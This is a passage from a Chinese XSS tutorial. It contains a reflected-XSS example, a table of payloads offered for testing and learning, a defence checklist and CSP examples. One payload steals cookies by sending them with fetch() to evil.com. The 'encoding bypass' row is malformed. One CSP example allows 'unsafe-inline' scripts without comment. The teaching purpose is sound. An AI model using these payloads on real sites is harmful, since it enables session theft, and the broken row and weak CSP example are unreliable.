攻击示例： http://example.com/search?q=<script>alert(document.cookie)</script>

当服务器直接将参数 q 的值渲染到页面而不转义时，脚本就会执行。

4. 常见 XSS Payload

用于测试和学习的常见 XSS 攻击向量：

类型 Payload 说明
基础 Script <script>alert(1)</script> 最基础的脚本注入
IMG onerror <img src=x onerror=alert(1)> 利用图片加载错误触发
SVG onload <svg onload=alert(1)> SVG 加载时触发
IFRAME <iframe src="javascript:alert(1)"> iframe javascript 伪协议
事件处理器 <div onmouseover="alert(1)">hover</div> 鼠标悬停触发
Cookie 窃取 <img src=x onerror="fetch('https://evil.com?c='+document.cookie)"> 发送 Cookie 到攻击者服务器
编码绕过 <img src=x onerror=alert</img> HTML 实体编码

5. XSS 防御最佳实践

核心原则：永远不要信任用户输入，对所有输入进行验证，对所有输出进行转义。

防御清单

措施 说明 优先级
输出转义 使用 textContent 或转义函数 必须
Content Security Policy 设置 CSP 头限制脚本来源 必须
HttpOnly Cookie 防止 JavaScript 访问 Cookie 必须
输入验证 白名单过滤用户输入 推荐
使用框架 React/Vue 默认转义输出 推荐
DOMPurify 使用专业库清理 HTML 推荐

CSP 配置示例

// HTTP 响应头 Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com // HTML meta 标签 <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'"> // Express 中间件 app.use(helmet.contentSecurityPolicy({ directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'", 'https://cdn.trusted.com'], styleSrc: ["'self'", "'unsafe-inline'"], imgSrc: ["'self'", 'data:'], } }));
